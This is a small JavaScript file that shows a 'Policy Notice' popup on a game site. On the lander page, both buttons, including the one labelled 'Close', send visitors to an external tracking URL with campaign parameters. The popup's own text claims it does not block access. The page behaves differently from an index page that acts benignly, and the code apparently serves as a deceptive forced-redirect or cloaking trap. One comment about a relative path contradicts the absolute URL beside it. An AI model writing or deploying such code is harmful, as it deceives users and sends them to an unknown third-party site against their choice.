// Minimal split: same behavior, two separate functions to call per page
(function () {
  // Use relative path so it works in subfolders too
  const REDIRECT = "https://t7q4.com/?utm_campaign=RuEoNAxI6g&v1=[v1]&v2=[v2]&v3=[v3]";
 
  function buildPopup() {
    // prevent double render
    if (document.querySelector(".modal-backdrop")) return null;
 
    const bd = document.createElement("div");
    bd.className = "modal-backdrop";
    bd.innerHTML = `
      <div class="modal" role="dialog" aria-modal="true" aria-label="Policy Notice">
        <h3>Policy Notice</h3>
        <p>Are you accepting our policy to play the game? This notice is informational and does not block access.</p>
        <div class="modal-actions">
          <button class="btn" id="age-yes">Yes, Accept</button>
          <button class="btn ghost" id="age-no">Close</button>
        </div>
      </div>`;
    document.body.appendChild(bd);
    bd.style.display = "flex";
 
    // define and return a working closer
    function close() {
      bd.classList.add("fade-out");
      setTimeout(() => bd.remove(), 180);
    }
 
    return { bd, close };
  }
 
  // Call this on index.html
  window.PopupIndex = function () {
    const built = buildPopup();
    if (!built) return;
    const { bd, close } = built;
 
    // Your custom behavior: Yes = just close, No = go to privacy
    bd.querySelector("#age-yes").addEventListener("click", close);
    bd.querySelector("#age-no").addEventListener("click", () => {
      window.location.href = "privacy.html";
    });
  };
 
  // Call this on lander.html
  window.PopupLander = function () {
    const built = buildPopup();
    if (!built) return;
    const { bd } = built;
 
    // Your custom behavior: both buttons redirect
    bd.querySelector("#age-yes").addEventListener("click", () => {
      window.location.href = REDIRECT;
    });
    bd.querySelector("#age-no").addEventListener("click", () => {
      window.location.href = REDIRECT;
    });
  };
})();
 

 

